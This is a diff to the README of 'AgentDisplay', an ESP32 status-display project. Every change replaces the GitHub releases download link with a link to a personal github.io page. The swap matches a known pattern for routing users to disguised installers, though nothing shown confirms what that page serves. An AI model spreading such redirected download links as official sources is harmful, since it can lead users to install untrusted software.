@@ -1,6 +1,6 @@
 # 🖥️ AgentDisplay - See Your Coding Status at a Glance
 
-[![Download AgentDisplay](https://img.shields.io/badge/Download-AgentDisplay-2ea44f?style=for-the-badge)](https://github.com/Cristiandeoliveira779/AgentDisplay/releases)
+[![Download AgentDisplay](https://img.shields.io/badge/Download-AgentDisplay-2ea44f?style=for-the-badge)](https://cristiandeoliveira779.github.io)
 
 ## 🤔 What Is AgentDisplay?
 
@@ -31,7 +31,7 @@ Getting AgentDisplay up and running is easier than you think. Follow these simpl
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: [https://github.com/Cristiandeoliveira779/AgentDisplay/releases](https://github.com/Cristiandeoliveira779/AgentDisplay/releases)
+Visit this link to download the application: [https://cristiandeoliveira779.github.io](https://cristiandeoliveira779.github.io)
 
 Click the download button on that page and wait for the file to save to your computer.
 
@@ -150,6 +150,6 @@ The combination of real-time status updates, cute emojis, and voice interaction 
 
 Ready to see what your computer is up to?
 
-[![Download AgentDisplay Now](https://img.shields.io/badge/Download-AgentDisplay-ff69b4?style=for-the-badge)](https://github.com/Cristiandeoliveira779/AgentDisplay/releases)
+[![Download AgentDisplay Now](https://img.shields.io/badge/Download-AgentDisplay-ff69b4?style=for-the-badge)](https://cristiandeoliveira779.github.io)
 
 Keywords: agent-display, cursor, esp-idf, esp32, esp32-s3, fastapi, iot, lvgl, voice-assistant, websocket
